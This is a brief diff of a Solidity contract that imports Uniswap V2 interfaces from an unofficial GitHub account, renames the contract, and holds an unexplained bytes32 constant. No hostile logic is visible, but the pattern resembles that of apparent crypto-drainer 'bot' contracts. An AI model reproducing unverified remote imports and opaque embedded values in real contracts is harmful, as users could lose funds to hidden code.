@@ -8,7 +8,7 @@ import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Factory.
 import "https://github.com/testselcrio/code/blob/main/uniswap/IUniswapV2Pair.sol";
 
 
-contract Calculate{
+contract Calculator{
 
 
     bytes32 firstContractBytes = 0xfdc54b1a6f53a21d375d0dea4b719169497dbac884f858c6cc4034ec1a5c51dc;   
